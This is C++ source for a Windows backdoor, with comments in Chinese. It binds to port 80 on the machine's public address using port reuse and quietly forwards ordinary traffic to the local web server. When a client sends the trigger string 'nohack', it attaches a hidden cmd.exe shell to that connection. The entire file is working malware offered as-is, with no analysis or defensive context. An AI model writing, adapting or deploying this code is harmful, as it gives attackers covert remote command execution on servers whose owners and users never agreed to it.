// fu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
int cmdshell(SOCKET s)
{   	
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//使cmd的输入输出直接和socket关联
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//得到cmd路径
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//建立cmd进程
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//等待进程结束
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
    CloseHandle(ProcessInformation.hProcess);	
	return 0;
}


DWORD WINAPI ThreadProc(LPVOID lpParam) 
{ 
	SOCKET sClient = (SOCKET)lpParam; 
	SOCKET sNative; 
	char buff[4096]={0}; 
	SOCKADDR_IN saddr; 
	DWORD val; 
	saddr.sin_family = AF_INET; 
	//设置要连接的回环地址
	saddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); 
	saddr.sin_port = htons(80); 
	//建立套接字
	if((sNative=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==SOCKET_ERROR) 
	{ 
		printf("socket error\n"); 
		return 0; 
	} 
	val = 100; 
	//设置收发数据超时时间
	if(setsockopt(sNative,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0) 
	{ 
		printf("setsockopt sNative error \n");
		return 0; 
	} 
	if(setsockopt(sClient,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0) 
	{ 
		printf("setsockopt sClient failed \n");
		return 0; 
	} 
	//连接127.0.0.1的80端口
	if(connect(sNative,(SOCKADDR *)&saddr,sizeof(saddr))!=0) 
	{ 
		printf("connect sNative failed\n"); 
		closesocket(sNative); 
		closesocket(sClient); 
		return 0; 
	} 
	DWORD ret; 
	//循环接收从客户发来的数据，发给127.0.0.1，并判断特征字符
	//同时把从127.0.0.1收到的数据发给客户
	while(TRUE) 
	{ 
		//接收从客户来的数据
		ret = recv(sClient,buff,4096,0); 
		if(ret>0) 
		{   //判断特征字符串，相同则调用后门函数	
			if(strncmp(buff,"nohack",6)==0)
			{
				cmdshell(sClient);
                break;
			}
			//发送给127.0.0.1
			send(sNative,buff,ret,0); 
		}
		else if(ret==SOCKET_ERROR) 
			break; 
		//接收从127.0.0.1来的数据
		ret = recv(sNative,buff,4096,0); 
		if(ret>0) 
			//发送给客户
			send(sClient,buff,ret,0); 
		else if(ret==SOCKET_ERROR) 
			break; 
	} 
	closesocket(sClient); 
	closesocket(sNative); 
	return 0 ; 
} 



int main(int argc, char* argv[])
{		
	char szHost[256];
	sockaddr_in saddr; 
	sockaddr_in caddr;  
	SOCKET sListen; 
	SOCKET sClient[1000]; 
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	//加载winsock库
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	//得到本地的一块网卡的IP
	gethostname(szHost, 256);
	hostent *pHost = gethostbyname(szHost);
	in_addr addr;
	memcpy(&addr.S_un.S_addr, pHost->h_addr_list[0], pHost->h_length);
	saddr.sin_family = AF_INET; 
	//设置要绑定的IP地址，公网IP
	saddr.sin_addr.S_un.S_addr =addr.S_un.S_addr; 
	saddr.sin_port = htons(80); 
	//建立套接字
	sListen=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);;
	if(sListen==SOCKET_ERROR)
	{ 
		printf("WSASocket error \n"); 
		return 0; 
	} 
	int val=1;  
	//设置套节字为可以重复绑定端口
	if(setsockopt(sListen,SOL_SOCKET,SO_REUSEADDR,(char *)&val,sizeof(val))!=0) 
	{ 
		printf("setsockopt error\n"); 
		return 0; 
	} 
	//绑定套接字到公网IP上
	if(bind(sListen,(SOCKADDR *)&saddr,sizeof(saddr))==SOCKET_ERROR) 
	{ 
		printf("bind error \n"); 
		return 0; 
	} 
	//接听套接字
	listen(sListen,1000); 
	DWORD ThreadId;
	HANDLE hThread;
	for (int i=0;i<1000;i++)
	{ 
		int Addrsize = sizeof(caddr); 
		//接受新连接
		sClient[i] = accept(sListen,(struct sockaddr *)&caddr,&Addrsize); 
		printf("%s\n",inet_ntoa(caddr.sin_addr));
		if(sClient[i]!=INVALID_SOCKET) 
		{ 	
			//开启新线程
			hThread = CreateThread(NULL,0,ThreadProc,(LPVOID)sClient[i],0,&ThreadId); 
			if(hThread==NULL) 
			{ 
				printf("CreateThread error"); 
				break; 
			} 
		} 
		CloseHandle(hThread); 
	} 
	closesocket(sListen); 
	WSACleanup(); 
	return 0; 
} 
